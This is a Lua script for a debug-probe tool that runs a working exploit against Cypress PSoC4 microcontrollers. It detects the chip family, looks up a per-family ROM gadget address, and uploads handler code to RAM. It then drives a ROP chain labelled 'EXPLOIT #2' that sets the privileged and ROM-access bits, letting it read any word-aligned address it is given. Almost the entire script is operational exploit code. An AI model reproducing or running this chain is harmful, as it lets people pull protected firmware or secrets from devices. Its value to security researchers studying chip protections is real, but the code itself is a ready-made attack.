PSOC_CPUID_REG_ADDR					= 0xF0000FE0
PSOC41xx_42xx_ADDR_CPUSS_BASE		= 0x40000000
PSOC_OTHERS_ADDR_CPUSS_BASE			= 0x40100000

RAM_CODE_LOCATION					= 0x20000080
RAM_OFST_HANDLER					= 2
RAM_CODE							= 0x5088
RAM_LOC_STACK_TOP					= 0x20000700
SYSCALL_NUM							= 0x1234
MAX_STEPS							= 0x32
MAX_OFST							= 0x7C


PSOC4xxx_ADDROFST_CPUSS_SYSREQ		= 0x00000004
PSOC4xxx_SYSREQ_BIT_SYSCALL_REQ		= 0x80000000
PSOC4xxx_SYSREQ_BIT_ROM_ACCESS_EN	= 0x20000000
PSOC4xxx_SYSREQ_BIT_PRIVILEDGED		= 0x10000000
PSOC4xxx_ADDROFST_CPUSS_SYSARG		= 0x00000008

DHCSR_BITS_KEY						= 0xa05f0000
DHCSR_BITS_WRITEABLE				= 0x0000ffff
DHCSR_BIT_STEP						= 0x00000004
DHCSR_BIT_HALT						= 0x00000002
DHCSR_BIT_DEBUGEN					= 0x00000001

ADDR_DHCSR							= 0xE000EDF0
ADDR_DEMCR							= 0xE000EDFC


function psoc4Idenfy()

	local family = cpuWordRead(PSOC_CPUID_REG_ADDR)

	if not family then
		error(" Failed to read PSoC romtab CPUID")
	end
	
	if (family >> 8) ~= 0 then
		error(string.format(" PSoC romtab CPUID invalid 0x%08X", family))
	end
	
	local cpuss = PSOC_OTHERS_ADDR_CPUSS_BASE
	local exploitBase = nil
	
	if family == 0x93 then
		print(" PSoC4100/4200 detected")
		cpuss = PSOC41xx_42xx_ADDR_CPUSS_BASE
		exploitBase = 0x100001bc
	elseif family == 0x9E then
		print(" CYBL10x6x (PSoC4000-BLE?) detected")
		exploitBase = 0x100001ae;
	elseif family == 0x9A then
		print(" PSoC4000 detected")
		exploitBase = 0x10000184;
	elseif family == 0xA1 then
		print(" PSoC4100M/4200M detected")
		exploitBase = 0x100001b4;
	elseif family == 0xA9 then
		print(" PSoC4000S detected")
		exploitBase = 0x100001a0;
	else
		error(string.format(" Unknown PSoC 0x%02X detected. Exploit unlikely\n", family))
	end
	
	--[[
		other known vals:
		AE, A3, AA - PSoC_BLE of some type
		
		69 - PSoC5
		A0 - 4200L
		A7 - 4200D ? 
		AB - 4100S
		AC - analog coprocessor (aka PSoC4400)
	--]]
	
	return exploitBase, cpuss
end


function main(step, haveDbg, haveCpu, haveScpt)

	if step == TOOL_OP_STEP_PRE_SCRIPT then
	
	--[[	==== upload ====
	
		setup:
			str r0, [r1]
		
		handler:
			ldr r6, =cpussBase
			ldr r5, =PSOC4xxx_SYSREQ_BIT_SYSCALL_REQ + PSOC4xxx_SYSREQ_BIT_PRIVILEDGED
			ldr r0, [r6, #4]
			bic r0, r5
			str r0, [r6, #4]
		3:
			bkpt
			b 3b
	--]]
		
		if not cpuStop() then
			error(" Failed to stop cpu")
		end
	
		--identify the chip
		exploitBase, cpussBase = psoc4Idenfy()
		
		--upload magic code
		local upload = {
			0x4E036008, 0x68704D03, 0x607043A8, 0xE7FDBE00,
			cpussBase, PSOC4xxx_SYSREQ_BIT_SYSCALL_REQ + PSOC4xxx_SYSREQ_BIT_PRIVILEDGED,
		}
		for i = 1,#upload do
			if not cpuWordWrite(RAM_CODE_LOCATION + 4 * (i - 1), upload[i]) then
				error(string.format(" Failed to write 0x%08X to [0x%08X]", upload[i], RAM_CODE_LOCATION + 4 * (i - 1)))
			end
		end
		
		--prepare DEMCR
		local val = cpuWordRead(ADDR_DEMCR)
		if not val then
			error(" Failed to read DEMCR")
		end
		val = val | (1 << 24)	--DWT on
		if not cpuWordWrite(ADDR_DEMCR, val) then
			error(" Failed to write DEMCR")
		end
		
		--prepare DHCSR
		local val = cpuWordRead(ADDR_DHCSR)
		if not val then
			error(" Failed to read DHCSR")
		end
		val = DHCSR_BITS_KEY | (val & DHCSR_BITS_WRITEABLE) | DHCSR_BIT_DEBUGEN	--enable debugging
		if not cpuWordWrite(ADDR_DHCSR, val) then
			error(" Failed to write DHCSR")
		end
		
		--prepare to run it (stack for exception return)
		if not cpuRegSet(0, PSOC4xxx_SYSREQ_BIT_SYSCALL_REQ) then	--cpuid call
			error(" Failed to set R0")
		end
		if not cpuRegSet(1, cpussBase + PSOC4xxx_ADDROFST_CPUSS_SYSREQ) then
			error(" Failed to set R1")
		end
		if not cpuRegSet(13, RAM_LOC_STACK_TOP) then
			error(" Failed to set SP")
		end
		if not cpuRegSet(15, RAM_CODE_LOCATION + 1) then
			error(" Failed to set PC")
		end
		
		--step twice
		for i = 0,1 do
			if not cpuStep() then
				error(string.format(" step %u of exploit part 1 fail", i))
			end
		end
		
		local pc = cpuRegGet(15)
		if not pc then
			error(" Failed to read PC")
		end
		
		if (pc & 0xfff00000) ~= 0x10000000 then
			print(string.format(" after step pc was 0x%08X\n", pc))
		end
		
		print(" execution in rom achieved")
		
		--next step: run the exploit
		if not cpuRegSet(0, RAM_LOC_STACK_TOP) then
			error(" Failed to set R0")
		end
		if not cpuRegSet(1, RAM_LOC_STACK_TOP) then
			error(" Failed to set R1")
		end
		if not cpuRegSet(2, cpussBase) then
			error(" Failed to set R2")
		end
		if not cpuRegSet(3, 0x00000000) then
			error(" Failed to set R3")
		end
		if not cpuRegSet(4, PSOC4xxx_SYSREQ_BIT_ROM_ACCESS_EN + PSOC4xxx_SYSREQ_BIT_PRIVILEDGED) then
			error(" Failed to set R4")
		end
		if not cpuRegSet(13, RAM_LOC_STACK_TOP) then
			error(" Failed to set SP")
		end
		if not cpuRegSet(15, exploitBase | 1) then	-- first exploit in the chain
			error(" Failed to set PC")
		end
		
		--SYSARG reg gets our desired address
		if not cpuWordWrite(cpussBase + PSOC4xxx_ADDROFST_CPUSS_SYSARG, mReadAddr - 0x0c) then
			error(" Failed to write SYSARG")
		end
		if not cpuWordWrite(RAM_LOC_STACK_TOP + 4, RAM_CODE_LOCATION + RAM_OFST_HANDLER + 1) then	-- ret addr (where we'll jump when done)
			error(" Failed to write exploit's [SP + 4]")
		end
		
		print(" EXPLOIT #2: setup")
		local val = cpuWordRead(ADDR_DHCSR)
		if not val then
			error(" Failed to read DHCSR 2")
		end
		val = DHCSR_BITS_KEY | (val & DHCSR_BITS_WRITEABLE &~ DHCSR_BIT_STEP &~ DHCSR_BIT_HALT) | DHCSR_BIT_DEBUGEN	--keep debugging enabled and go
		if not cpuWordWrite(ADDR_DHCSR, val) then
			error(" Failed to write DHCSR 2")
		end
		
		print(" EXPLOIT #2: going")
		local startTime = os.clock()
		
		while true do
		
			if os.clock() - startTime > 1.0 then
				error(" exploit #2 (ROP) timeout");
			end
			
			val = cpuWordRead(ADDR_DHCSR)
			if val then
				
				if (val & 3) == 3 then
					print(" EXPLOIT #2: halted")
					break
				end
			end
		end 
		
		local val = cpuRegGet(4)
		if not val then
			error(" Failed to read result")
		end
		
		print(string.format("[0x%08x] = 0x%08x\n", mReadAddr, val))
		
		cpuReset()
	end
	
	return true
end

function init(params)

	local addr = tonumber(params)
	if not addr then
		error("This SPECIAL script needs a parameter - the address to read")
	end
	if addr < 0 or (addr >> 32) ~= 0 or (addr & 3) ~= 0 then
		error("The given parameter is not a valie word-aligned adddress")
	end

	mReadAddr = addr

	return TOOL_OP_NEEDS_DEBUGGER | TOOL_OP_NEEDS_CPU
end